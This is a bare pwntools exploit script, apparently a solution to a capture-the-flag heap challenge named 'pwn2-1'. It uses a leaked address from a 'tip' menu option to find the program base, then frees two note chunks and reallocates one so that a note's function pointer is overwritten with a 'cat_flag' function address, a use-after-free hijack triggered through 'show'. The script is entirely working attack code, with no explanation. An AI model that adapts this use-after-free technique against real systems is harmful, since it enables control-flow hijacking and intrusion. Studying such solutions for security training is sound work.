from pwn import*
context(os='linux',arch='amd64',log_level='debug')

s = remote('',)
#s = process('./pwn2-1')

def add(size,content):
	s.sendlineafter(b'Your choice :', b'1')
	s.sendlineafter(b'Note size :', str(size))
	s.sendlineafter(b'Content :', content)

def delete(index):
	s.sendlineafter(b'Your choice :', b'2')
	s.sendlineafter(b'Index :', str(index))

def show(index):
	s.sendlineafter(b'Your choice :', b'3')
	s.sendlineafter(b'Index :', str(index))

def tip():
	s.sendlineafter(b'Your choice :', b'5')

tip()
s.recvuntil(b'let us give you some tips\n')
elf_base = int(s.recv(14),16) - 0x11F0
success('elf_base=>' + hex(elf_base))

cat_flag = elf_base + 0x1B70
heap_bss = elf_base + 0x40a0

add(0x10, b'a')
add(0x20, b'a')

delete(0)
delete(1)

add(0x10, p64(cat_flag))


show(0)

s.interactive()
